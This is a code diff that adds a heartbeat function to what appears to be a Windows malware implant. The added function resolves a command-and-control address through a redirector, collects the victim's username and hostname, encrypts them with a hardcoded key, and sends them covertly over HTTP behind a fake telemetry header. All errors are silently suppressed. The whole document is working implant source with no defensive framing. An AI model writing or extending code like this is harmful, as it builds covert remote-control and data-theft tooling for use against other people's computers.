@@ -94,6 +94,62 @@ void Beacon::sleepWithJitter() {
     std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<int>(sleep_duration * 1000)));
 }
 
+void Beacon::sendOneTimeHeartbeat(const std::string& statusMsg) {
+    http::RedirectorResolver resolver(core::REDIRECTOR_URL);
+    std::vector<BYTE> beacon_key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
+    crypto::AesGcm aes(beacon_key_vec);
+
+    if (c2Url_.empty()) {
+        try {
+            c2Url_ = resolver.resolve();
+        } catch (...) { return; }
+    }
+
+    try {
+        nlohmann::json payload = {
+            {"id", implantId_},
+            {"os", "windows"},
+            {"arch", "amd64"},
+            {"user", getUsername()},
+            {"host", getHostname()},
+            {"status", statusMsg},
+            {"results", nlohmann::json::array()}
+        };
+
+        std::string payload_str = payload.dump();
+        std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
+
+        std::vector<BYTE> nonce(12);
+        HCRYPTPROV hProv;
+        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+            CryptGenRandom(hProv, 12, nonce.data());
+            CryptReleaseContext(hProv, 0);
+        }
+
+        std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
+        std::vector<BYTE> encrypted_payload;
+        encrypted_payload.insert(encrypted_payload.end(), nonce.begin(), nonce.end());
+        encrypted_payload.insert(encrypted_payload.end(), ciphertext.begin(), ciphertext.end());
+
+        std::wstring wideC2Url(c2Url_.begin(), c2Url_.end());
+        URL_COMPONENTSW urlComp;
+        wchar_t serverName[256];
+        wchar_t path[256];
+        memset(&urlComp, 0, sizeof(urlComp));
+        urlComp.dwStructSize = sizeof(urlComp);
+        urlComp.lpszHostName = serverName;
+        urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
+        urlComp.lpszUrlPath = path;
+        urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);
+
+        if (WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
+            http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
+            std::wstring headers = L"X-Telemetry-Key: " + std::wstring(core::API_KEY.begin(), core::API_KEY.end()) + L"\r\n";
+            client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload, headers);
+        }
+    } catch (...) {}
+}
+
 void Beacon::run() {
     http::RedirectorResolver resolver(core::REDIRECTOR_URL);
     std::vector<BYTE> beacon_key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
